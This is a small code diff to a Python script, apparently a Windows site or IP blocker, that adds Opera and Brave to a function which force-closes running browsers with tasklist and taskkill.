@@ -4,6 +4,8 @@ def close_browsers():
     if os.system('tasklist | find "msedge.exe"') == 0: os.system("taskkill /im msedge.exe /f")
     if os.system('tasklist | find "chrome.exe"') == 0: os.system("taskkill /im chrome.exe /f")
     if os.system('tasklist | find "firefox.exe"') == 0: os.system("taskkill /im firefox.exe /f")
+    if os.system('tasklist | find "opera.exe"') == 0: os.system("taskkill /im opera.exe /f")
+    if os.system('tasklist | find "brave.exe"') == 0: os.system("taskkill /im brave.exe /f")
 
 def blocked_IPS():
     blocked_ip = {}
